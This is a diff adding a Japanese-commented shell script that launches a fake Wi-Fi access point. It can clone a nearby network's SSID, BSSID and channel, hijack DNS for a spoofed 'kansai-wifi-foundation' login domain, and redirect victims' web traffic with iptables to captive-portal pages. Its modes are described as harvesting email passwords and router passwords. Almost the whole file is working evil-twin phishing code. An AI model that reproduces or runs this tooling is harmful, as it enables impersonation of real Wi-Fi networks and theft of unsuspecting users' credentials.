@@ -1,0 +1,254 @@
+#!/bin/sh
+
+IFACEDST="wlan0"
+IFACESRC="wlan1"
+IFACEMON="wlan1mon"
+DSTRANGE="192.168.168"
+
+apname=$1	# SSID
+apmac=$2	# BSSID、NULL=変更なし、1=ランダム、0=存在するnameと合わせる
+apch=$3		# チャンネル、NULL=12、0=存在するnameと合わせる
+appass=$4	# パスワード、NULLで暗号化なし
+apvisible=$5	# 0=ステルス
+mode=$6		# フィッシングモード
+
+# モード
+# 0 = 制限・キャプティブポータルなし
+# 1 = メール＆PASS用（フリーWI-FIログイン）
+# 2 = ルーターPASS用（ルーター接続設定）
+# 3 = メンテナンス表示
+
+
+if [ ! "$1" ]; then
+	echo usage: start ssid [bssid] [ch] [pass] [visible] [mode]
+	exit
+fi
+
+if [ ! "$SUDO_USER" ]; then
+	echo "run as it root"
+	exit
+fi
+
+if [ ! "$apname" ]; then
+	echo "ESSID is required"
+	exit
+fi
+
+if [ ! "`iwconfig 2>/dev/null | grep $IFACESRC`" ]; then
+	echo "$IFACESRC is not exists"
+	exit
+fi
+
+
+echo 'STARTING FAKE AP'
+
+if [ "iwconfig | grep $IFACEMON" ]; then
+	./stop >/dev/null 2>&1
+	ifconfig $IFACESRC up
+	sleep 3
+fi
+
+
+if [ "$apmac" = "0" ] || [ "$apch" = "0" ]; then
+	iwlist=`nmcli -f SSID,BSSID,CHAN dev wifi | grep $apname`
+
+	if [ ! "${iwlist}" ]; then
+		echo $apname is not detect
+		exit
+	fi
+fi
+
+
+if [ "${apmac}" = "0" ]; then
+	apmac=`echo $iwlist | awk '{print $2}'`
+elif [ "${apmac}" = "1" ]; then
+	apmac=00:`cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 2 | tr '[:upper:]' '[:lower:]'`
+	apmac=$apmac:`cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 2 | tr '[:upper:]' '[:lower:]'`
+	apmac=$apmac:`cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 2 | tr '[:upper:]' '[:lower:]'`
+	apmac=$apmac:`cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 2 | tr '[:upper:]' '[:lower:]'`
+	apmac=$apmac:`cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 2 | tr '[:upper:]' '[:lower:]'`
+fi
+
+if [ ! "${apch}" ]; then
+	apch=12
+elif [ "$apch" = "0" ]; then
+	apch=`echo $iwlist | awk '{print $3}'`
+fi
+
+if [ ! "${apvisible}" ] || [ "${apvisible}" = "1" ]; then
+	apvisible=1
+elif [ "${apvisible}" != "0" ]; then
+	apvisible=1
+fi
+
+if [ ! "${mode}" ] || [ "${mode}" = "1" ]; then
+	mode=1
+fi
+
+
+myip=`ifconfig | grep -e "inet 192.168." -e "inet 172.16." -e "inet 10." | grep -v ".44.111" | grep -v "$DSTRANGE." | awk '{print $2}'`
+mygw=`echo $myip | awk -F "." '{print $1"."$2"."$3".1"}'`
+mynet=`echo $myip | awk -F "." '{print $1"."$2"."$3".0/24"}'`
+
+
+cat - <<EOD > /opt/fakeap/conf/dnsmasq.conf
+interface=$IFACEMON
+dhcp-range=$DSTRANGE.101,$DSTRANGE.130,255.255.255.0,2h
+dhcp-option=3,$DSTRANGE.1
+dhcp-option=6,$DSTRANGE.1
+server=8.8.8.8
+listen-address=127.0.0.1
+EOD
+
+if [ ${mode} -ne 0 ]; then
+cat - <<EOD >> /opt/fakeap/conf/dnsmasq.conf
+address=/login.kansai-wifi-foundation.jp/$DSTRANGE.1
+address=/login.ssid.setting/$DSTRANGE.1
+EOD
+fi
+
+cat - <<EOD > /opt/fakeap/conf/hostapd.conf
+interface=$IFACEMON
+driver=nl80211
+ssid=${apname}
+hw_mode=g
+channel=${apch}
+country_code=JP
+ht_capab=[HT40] [SHORT-GI-20] [DSSS_CCK-40]
+
+#rts_threshold=2347
+#fragm_threshold=2346
+wmm_enabled=1
+disassoc_low_ack=1
+require_ht=0
+
+ieee80211n=1
+ieee80211d=1
+ieee80211h=0
+ieee80211ac=0
+
+EOD
+
+if [ "${apvisible}" = "0" ]; then
+cat - <<EOD >> /opt/fakeap/conf/hostapd.conf
+ignore_broadcast_ssid=1
+EOD
+fi
+
+if [ "${appass}" ]; then
+cat - <<EOD >> /opt/fakeap/conf/hostapd.conf
+auth_algs=1
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_passphrase=${appass}
+EOD
+fi
+
+if [ $mode -ne 0 ] && [ $mode -ne 9 ]; then
+cat - <<EOD > /opt/fakeap/www/.htaccess
+RewriteEngine On
+RewriteBase /
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteRule (.*) /index${mode}.php [L]
+EOD
+fi
+
+echo -n $apname > /opt/fakeap/conf/apname
+echo -n $appass > /opt/fakeap/conf/appass
+
+
+echo 'SSID    :' ${apname}
+echo 'BSSID   :' ${apmac}
+echo 'CHANNEL :' ${apch}
+echo 'PASS    :' ${appass}
+echo 'VISIBLE :' ${apvisible}
+echo 'MODE    :' ${mode}
+
+echo -n '.';
+
+
+#echo none > /sys/class/leds/ath9k_htc-phy1/trigger
+
+#airmon-ng start $IFACESRC 
+ifconfig $IFACESRC down
+echo -n '.';
+iw dev $IFACESRC interface add $IFACEMON type monitor
+echo -n '.';
+ifconfig $IFACEMON up $DSTRANGE.1 netmask 255.255.255.0
+echo -n '.';
+
+#route add -net $DSTRANGE.0 netmask 0.0.0.0 gw $DSTRANGE.1
+
+
+
+if [ "${apmac}" ]; then
+	ifconfig $IFACEMON down
+	ip link set dev $IFACEMON address ${apmac}
+fi
+
+echo -n '.'
+
+#ifconfig $IFACEMON up
+ifconfig $IFACESRC up
+
+echo -n '.';
+
+
+if [ ${mode} -ne 0 ]; then
+	for i in `seq 101 130`
+	do
+		iptables -t nat -A PREROUTING -i $IFACEMON -s $DSTRANGE.$i -p tcp --dport 80 -j DNAT --to $DSTRANGE.1:80
+		iptables -t nat -A PREROUTING -i $IFACEMON -s $DSTRANGE.$i -p tcp --dport 443 -j DNAT --to $DSTRANGE.1:443
+	done
+fi
+
+echo -n '.';
+
+iptables -t nat -A POSTROUTING -o $IFACEDST -j MASQUERADE
+iptables -A FORWARD -i $IFACEDST -o $IFACEMON -m state --state RELATED,ESTABLISHED -j ACCEPT
+iptables -A FORWARD -i $IFACEMON -o $IFACEDST -j ACCEPT
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+echo -n '.';
+
+
+start-stop-daemon --start --quiet --exec "/usr/sbin/dnsmasq" -- -C "/opt/fakeap/conf/dnsmasq.conf" >/dev/null 2>&1 &
+if [ $? -ne 0 ]; then
+	echo start dnsmasq faild
+	exit
+fi
+
+echo -n '.';
+
+
+start-stop-daemon --start --quiet --exec "/usr/sbin/hostapd" -- "/opt/fakeap/conf/hostapd.conf" >/dev/null 2>&1 &
+if [ $? -ne 0 ]; then
+	echo start hostapd faild
+	exit
+fi
+
+echo -n '.';
+
+sleep 3
+#route del default gw $mygw
+#route add -net $mynet gw $mygw dev $IFACEDST metric 1
+#route add -net $mynet gw $mygw $IFACEDST
+echo -n '.';
+
+route add -net $DSTRANGE.0/24 gw $DSTRANGE.1 $IFACEMON
+echo -n '.';
+
+route del default gw 192.168.44.1 >/dev/null 2>&1
+
+echo -n '.';
+
+
+iw $IFACEMON set power_save off
+iwconfig $IFACEMON txpower 20
+#iwconfig $IFACEMON frag 512
+#iwconfig $IFACEMON rts 500
+iwconfig $IFACEMON rate 200M auto
+
+echo '\nOK. FAKE AP STARTED'
